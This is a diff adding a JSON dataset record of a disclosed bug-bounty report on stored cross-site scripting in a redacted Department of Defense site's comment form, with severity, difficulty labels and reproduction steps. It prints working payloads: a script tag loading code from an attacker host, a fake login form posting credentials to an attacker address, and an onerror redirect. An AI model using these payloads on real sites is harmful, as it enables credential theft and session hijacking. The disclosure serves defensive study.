@@ -1,0 +1,49 @@
+{
+    "reported_to": "U.S. Dept Of Defense",
+    "reported_by": "un4gi ",
+    "title": "Stored XSS via Comment Form at \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588",
+    "content": "\nSummary:\nAn attacker can submit a comment form with injected HTML, leading to a number of malicious effects\nStep-by-step Reproduction Instructions\nBrowse to https://\u2588\u2588\u2588\u2588\nComplete the form. I placed \"><script src=http://attackerip/blind.js/> in the Name field. Some example payloads for the Comments field are as follows:\nFor credential theft, an attacker could place <h3>Please login to proceed</h3><form action=http://attackerIP>Username:<br><input type=\"username\" name=\"username\"></br>Password:<br><input type=\"password\" name=\"password\"></br><br><input type=\"submit\" value=\"Logon\"></br> in the Comments field.\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\nTo redirect to a malicious website, an attacker could use <img src=x onerror='javascript:window.open(\"http://catcompusa.com\")'></img>.\n\u2588\u2588\u2588\u2588\u2588\u2588\nThe malicious website will open in a new tab when the image fails to load as shown below:\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nConclusions\nThis leads me to believe that once a \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 employee reads the comment, the code will be injected into their browser as well.\nAdditionally, the blind XSS payload injected into the Name field seemed to cause a hit on my weblog from \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 and \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588. \u2588\u2588\u2588\u2588\u2588\nSuggested Mitigation/Remediation Actions\nSanitize how user input is parsed by the server before being reflected onto the resulting comment page to prevent XSS/HTML injection.\nImpact\nThe attacker could achieve numerous effects such as credential theft, forced browsing, keystroke logging, drive-by downloads, etc. ultimately leading to administrative access over the \u2588\u2588\u2588\u2588\u2588 website and potentially other internal resources.\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Cross-site Scripting (XSS) - Stored"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1601425020,
+    "report_url": "https://hackerone.com/reports/915073",
+    "is_multi_component": false,
+    "complexity": "MEDIUM",
+    "novelty": "LOW",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Browse to the target website and locate the comment form."
+        ],
+        [
+            2,
+            "Inject malicious HTML/JavaScript payloads into the Name and Comments fields (e.g., `<script src=http://attackerip/blind.js/>` or `<form action=http://attackerIP>`)."
+        ],
+        [
+            3,
+            "Submit the form and observe the execution of the payload when the comment is viewed by an employee or another user."
+        ]
+    ],
+    "vuln_description": "A stored Cross-Site Scripting (XSS) vulnerability exists in the comment form of the target website, allowing attackers to inject malicious scripts that execute in the context of other users' browsers when the comments are viewed. This can lead to credential theft, forced browsing, or other malicious actions.",
+    "reason": "The vulnerability is straightforward to discover as it involves injecting common XSS payloads into input fields without any complex interactions or state manipulations. The attack does not require understanding of novel logic or subtle interactions between components.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "injection_metadata": {
+        "is_simple_payload": true
+    },
+    "authnz_metadata": {
+        "reason": "The stored XSS vulnerability involves injecting malicious scripts via user input fields (Name and Comments) that are then executed when viewed by another user (e.g., an employee). This does not directly involve authentication or authorization bypass but rather exploits improper input sanitization leading to client-side code execution. The methodology described focuses on testing authentication and authorization boundaries by swapping user sessions and resource IDs, which is not applicable here as the vulnerability does not rely on crossing such boundaries.",
+        "is_detectable": false
+    }
+}
